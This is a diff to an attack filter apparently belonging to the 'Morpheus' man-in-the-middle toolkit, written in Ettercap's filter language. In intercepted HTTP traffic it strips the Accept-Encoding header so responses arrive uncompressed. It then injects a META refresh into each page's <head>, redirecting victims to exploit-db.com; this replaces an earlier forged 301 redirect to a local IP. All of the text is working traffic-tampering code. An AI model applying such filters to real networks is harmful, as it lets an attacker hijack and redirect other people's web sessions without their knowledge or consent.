@@ -12,7 +12,7 @@
 
 ##
 #  This filter will redirect target request 
-#  to the specified ip address.
+#  to the specified ip address. <http-equiv>
 ##
 
 
@@ -22,7 +22,7 @@
 if (ip.proto == TCP && tcp.dst == 80){
    if (search(DATA.data, "Accept-Encoding")){
     replace("Accept-Encoding", "Accept-Rubbish!");
-    msg("[Morpheus] Encoding zapped.");
+    msg("[Morpheus] target request Encoding zapped ✔");
    }
 }
 
@@ -31,9 +31,12 @@ if (ip.proto == TCP && tcp.dst == 80){
 ## Replace Content ##
 #####################
 if (ip.proto == TCP && tcp.src == 80){
- replace("200 OK", "301 Moved Permanently
- Location: http://192.168.200.201/
-");
+  msg("[morpheus] | status: injecting url!");
+  msg("[morpheus] |  https://www.exploit-db.com ✔");
+  msg("[morpheus] |_ head tag redirection injected successfuly ✔\n");
 
-msg("[Morpheus] redirect successefully...\n");
+   # redirect target to exploitdb by replacing <head> html tag with one redirection url
+   replace("<HEAD>", "<HEAD><META http-equiv=\"refresh\" content=\"0;URL=https://www.exploit-db.com/\">");
+   replace("<head>", "<head><META http-equiv=\"refresh\" content=\"0;URL=https://www.exploit-db.com/\">");
 }
+
